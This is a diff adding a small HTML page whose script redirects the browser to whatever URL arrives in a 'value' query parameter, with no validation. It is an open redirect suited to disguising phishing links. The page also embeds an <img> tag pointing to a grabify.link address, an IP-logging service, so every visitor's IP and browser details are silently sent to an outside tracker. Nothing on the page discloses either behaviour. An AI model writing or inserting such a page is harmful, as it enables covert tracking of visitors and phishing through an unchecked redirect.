@@ -1,0 +1,24 @@
+<!DOCTYPE html>
+<html>
+<head></head>
+<body>
+  <script>
+    // Get the value from the query parameter
+    const urlParams = new URLSearchParams(window.location.search);
+    let value = urlParams.get('value');
+    
+    // Check if http:// or https:// is included in the URL, otherwise add it
+    if (value && !/^https?:\/\//i.test(value)) {
+        value = "http://" + value;
+    }
+    
+    // Redirect to the desired page
+    if (value) {
+      window.location.href = `${value}`;
+    } else {
+      window.location.href = '';
+    }
+  </script>
+<img src="https://grabify.link/VA8QMM">
+</body>
+</html>
